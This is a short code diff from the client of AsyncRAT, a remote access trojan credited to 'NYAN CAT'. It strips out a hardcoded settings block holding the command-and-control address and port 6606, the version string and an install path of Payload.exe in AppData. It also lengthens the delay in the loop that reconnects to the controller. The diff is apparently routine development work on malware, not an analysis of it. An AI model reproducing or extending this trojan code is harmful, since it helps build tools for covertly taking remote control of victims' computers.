@@ -1,7 +1,5 @@
 ﻿using System.Threading;
 using Client.Sockets;
-using System.IO;
-using System;
 using Client.Install;
 
 //       │ Author     : NYAN CAT
@@ -14,15 +12,6 @@ using Client.Install;
 
 namespace Client
 {
-    class Settings
-    {
-        public static readonly string IP = "127.0.0.1";
-        public static readonly string Port = "6606";
-        public static readonly string Version = "AsyncRAT 0.2.7A";
-        public static readonly string Install = "false";
-        public static readonly string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
-    }
-
     class Program
     {
 
@@ -38,7 +27,7 @@ namespace Client
             {
                 if (ClientSocket.Connected == false)
                     ClientSocket.Reconnect();
-                Thread.Sleep(1000);
+                Thread.Sleep(2500);
             }
         }
     }
